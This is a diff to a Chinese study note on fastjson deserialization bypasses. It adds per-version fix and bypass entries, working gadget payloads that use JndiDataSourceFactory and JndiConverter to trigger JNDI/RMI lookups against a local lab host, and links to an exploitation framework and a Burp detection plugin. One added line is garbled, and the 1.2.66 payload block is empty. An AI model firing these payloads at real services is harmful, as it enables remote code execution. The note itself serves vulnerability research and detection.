@@ -1146,11 +1146,11 @@ ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  //开启autoTypeSupp
 JSON.parseObject(fastSer);
 ```
 
-很神奇，跟着异常，加了一个`[`，接着又抛出异常
+跟着异常，加了一个`[`，接着又抛出异常
 
 ![image-20250208115244324](./images/image-20250208115244324.png)
 
-再根据异常信息加一个`{`，就成功了，可能正是因为比较简单就得出了Payload，网上没有怎么找到相关的原理分析文章。
+很神奇，再根据异常信息加一个`{`，就成功了，可能正是因为比较简单就得出了Payload，网上没有怎么找到相关的原理分析文章。
 
 补充一下，从网上公布的Payload来看，这里写法是挺多样的，下列Payload都可以
 
@@ -1166,15 +1166,85 @@ JSON.parseObject(fastSer);
 
 ![image-20250208141812465](./images/image-20250208141812465.png)
 
-这里返回的反序列化器为一个`ObjectArrayCodec`类型
+这里返回的反序列化器为一个`ObjectArrayCodec`类型，其反序列化的逻辑又不同于我们之前分析的过程，对细节感兴趣的可以自行分析一下其反序列化过程。
+
+##### fastjson 1.2.44
+
+对于黑名**修复：**检测类名中的`[`字符，存在则抛出异常单绕过的修复到这一版本就很完善了，但由于黑名单这个修复方式本身是不太适合这里的，导致后续不断有新的不在黑名单内的类被发现
+
+**修复：**检测类名中的`[`字符，存在则抛出异常
+
+![image-20250211095823050](./images/image-20250211095823050.png)
+
+**绕过：**
+
+采用新的黑名单之外的类`JndiDataSourceFactory`，不过需要常见依赖mybatis3.x.x ～ 3.5.0
+
+**Payload：**
+
+```java
+String fastSer =  "{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"rmi://127.0.0.1:1999/obj\"}}"; // 存在依赖mybatis3.x.x ～ 3.5.0
+ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  //开启autoTypeSupport
+JSON.parseObject(fastSer);
+```
+
+```xml
+<dependency>
+    <groupId>org.mybatis</groupId>
+    <artifactId>mybatis</artifactId>
+    <!-- 3.x.x ～ 3.5.0 -->
+    <version>3.5.0</version>
+</dependency>
+```
+
+
+
+##### fastjson1.2.46
+
+**修复：**ban掉了JndiDataSourceFactory
+
+**绕过：**新发现黑名单之外的类`org.apache.xbean.propertyeditor.JndiConverter`，依赖的版本没有深入研究，但是最新4.17是可以的
+
+**Payload：**
+
+```java
+String fastSer =  "{\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"AsText\":\"rmi://127.0.0.1:1999/exploit\"}";
+ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  //开启autoTypeSupport
+JSON.parseObject(fastSer);
+```
+
+```xml
+<dependency>
+    <groupId>org.apache.xbean</groupId>
+    <artifactId>xbean-reflect</artifactId>
+    <version>4.26</version>
+</dependency>
+```
+
+**fastjson1.2.66**
+
+**修复：**ban掉了org.apache.xbean.propertyeditor.JndiConverter
+
+**绕过：**新发现黑名单之外的类
+
+**Payload:**
+
+```json
+```
+
+
 
 ### 补充一下其他利用链
 
 ### Payload一览
 
+### 对于内置类的回顾
+
 ### 探测
 
 #### json反序列化库的探测
+
+利用不同json反序列化库的特性实现探测，这里给出fastjson的
 
 #### fastjson关键版本探测
 
@@ -1183,6 +1253,10 @@ JSON.parseObject(fastSer);
 #### 补充：成功探测
 
 ### 工具
+
+[c0ny1/FastjsonExploit: Fastjson vulnerability quickly exploits the framework（fastjson漏洞快速利用框架）](https://github.com/c0ny1/FastjsonExploit)
+
+[pmiaowu/BurpFastJsonScan: 一款基于BurpSuite的被动式FastJson检测插件](https://github.com/pmiaowu/BurpFastJsonScan)
 
 ### 总结
 
